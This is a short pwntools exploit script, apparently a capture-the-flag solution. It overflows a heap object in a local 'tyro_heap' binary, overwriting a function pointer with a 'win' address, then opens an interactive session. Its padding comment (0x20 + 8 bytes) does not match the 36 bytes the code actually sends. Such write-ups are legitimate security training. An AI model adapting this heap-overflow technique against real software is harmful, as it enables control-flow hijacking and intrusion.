from pwn import *
context(arch='i386', os='linux')

target = "./tyro_heap"
p = process(target)

addr_win = 0x08048660

print p.recvuntil("::>")

# create object [idx 0]
p.sendline("c")
print p.recvuntil("::>")

# create object [idx 1]
p.sendline("c")
print p.recvuntil("::>")

# read_b -> idx 0 -> "A" * 0x20 + "A" * 8 + p32(win)
p.sendline("b")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("AAAA"*9 + p32(addr_win))
print p.recvuntil("::>")

p.sendline("e")
print p.recv()
p.sendline("1")
print p.recv()

p.interactive()
